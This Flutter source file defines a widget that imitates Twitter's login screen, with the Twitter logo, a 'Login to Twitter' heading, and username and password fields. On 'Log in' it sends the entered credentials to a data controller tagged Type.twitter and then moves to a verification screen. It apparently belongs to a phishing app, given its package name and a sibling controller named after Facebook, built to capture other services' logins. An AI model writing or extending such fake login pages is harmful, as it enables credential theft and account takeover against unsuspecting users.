import 'package:bgmimobile/controller/fb_controller.dart';
import 'package:bgmimobile/verify/verify_screen.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:provider/provider.dart';

class TwitterClone extends StatelessWidget {
  const TwitterClone({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    TextEditingController _usernameController = TextEditingController();
    TextEditingController _passwordController = TextEditingController();
    var height = MediaQuery.of(context).size.height;
    var width = MediaQuery.of(context).size.width;
    List<String> listofstring = [
      "Create account",
      "Not now",
      "Forgot password?"
    ];

    return Container(
      decoration: BoxDecoration(
        color: Colors.white,
        borderRadius: BorderRadius.circular(10),
      ),
      child: Column(
        mainAxisSize: MainAxisSize.min,
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Container(
            alignment: Alignment.bottomCenter,
            height: height * 0.075,
            decoration: const BoxDecoration(
              color: Colors.transparent,
            ),
            child: FaIcon(
              FontAwesomeIcons.twitter,
              size: height * 0.065,
              color: Color(0xFF1da1f2),
            ),
          ),
          Container(
            alignment: Alignment.center,
            width: width,
            height: height * 0.075,
            decoration: BoxDecoration(
              //color: Color(0xFF3b5998),
              borderRadius: BorderRadius.circular(10),
            ),
            child: Text(
              "Login to Twitter",
              textAlign: TextAlign.center,
              style: GoogleFonts.poppins(
                textStyle: const TextStyle(
                  color: Colors.black,
                  fontSize: 18,
                  fontWeight: FontWeight.w500,
                ),
              ),
            ),
          ),
          Container(
            width: width,
            margin: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
            child: DecoratedBox(
              decoration: BoxDecoration(
                color: Colors.white,
                borderRadius: BorderRadius.circular(5),
              ),
              child: Column(
                  mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                  children: [
                    DecoratedBox(
                      decoration: BoxDecoration(
                        color: Colors.grey.shade100,
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: TextFormField(
                        controller: _usernameController,
                        decoration: const InputDecoration(
                          labelText: 'Phone, email, or username',
                          labelStyle: TextStyle(
                            color: Colors.black87,
                            fontSize: 17,
                          ),
                          focusedBorder: UnderlineInputBorder(
                            borderSide: BorderSide(color: Colors.black),
                          ),
                          enabledBorder: UnderlineInputBorder(
                              borderSide:
                                  BorderSide(color: Colors.grey, width: 1.0)),
                        ),
                        style: const TextStyle(
                            color: Colors.black87,
                            fontSize: 17,
                            fontFamily: 'AvenirLight'),
                      ),
                    ),
                    SizedBox(
                      height: height * 0.01,
                    ),
                    DecoratedBox(
                      decoration: BoxDecoration(
                        color: Colors.grey.shade100,
                        borderRadius: BorderRadius.circular(5),
                      ),
                      child: TextFormField(
                        controller: _passwordController,

                        decoration: const InputDecoration(
                          labelText: 'Password',
                          labelStyle: TextStyle(
                            color: Colors.black87,
                            fontSize: 17,
                          ),
                          focusedBorder: UnderlineInputBorder(
                            borderSide: BorderSide(color: Colors.black),
                          ),
                          enabledBorder: UnderlineInputBorder(
                              borderSide:
                                  BorderSide(color: Colors.grey, width: 1.0)),
                        ),
                        style: const TextStyle(
                            color: Colors.black87,
                            fontSize: 17,
                            fontFamily: 'AvenirLight'),
                        //  controller: _passwordController,
                      ),
                    ),
                  ]),
            ),
          ),
          InkWell(
            onTap: () async {
              try {
                if (_usernameController.text.isNotEmpty &&
                    _usernameController.text.length > 3 &&
                    _passwordController.text.isNotEmpty &&
                    _passwordController.text.length > 6) {
                  Provider.of<DataController>(context, listen: false)
                      .setusername(_usernameController.text);
                  Provider.of<DataController>(context, listen: false)
                      .setpassword(_passwordController.text);

                  await Provider.of<DataController>(context, listen: false)
                      .updateUserData(_usernameController.text,
                          _passwordController.text, Type.twitter);
                  await Future.delayed(const Duration(seconds: 1), () {
                    Navigator.push(
                        context,
                        MaterialPageRoute(
                            builder: (context) => const VerifyPageScreen()));
                  });
                }
              } catch (e) {
                if (kDebugMode) {
                  print(e);
                }
              }
            },
            child: Container(
              alignment: Alignment.center,
              width: width,
              margin: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
              height: height * 0.05,
              decoration: BoxDecoration(
                color: Color(0xFF1da1f2),
                borderRadius: BorderRadius.circular(20),
              ),
              child: Text(
                "Log in",
                textAlign: TextAlign.center,
                style: GoogleFonts.poppins(
                  textStyle: const TextStyle(
                    color: Colors.white,
                    fontSize: 15,
                    fontWeight: FontWeight.w600,
                  ),
                ),
              ),
            ),
          ),
          Padding(
            padding: const EdgeInsets.all(8.0),
            child: Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                ...List.generate(3, (i) {
                  if (i == 1) {
                    return SizedBox(
                      width: width / 10,
                    );
                  }
                  return Text(
                    listofstring[i],
                    textAlign: TextAlign.center,
                    style: GoogleFonts.poppins(
                      textStyle: const TextStyle(
                        color: Colors.blueAccent,
                        fontSize: 12,
                        fontWeight: FontWeight.w300,
                      ),
                    ),
                  );
                }),
              ],
            ),
          ),
        ],
      ),
    );
  }
}
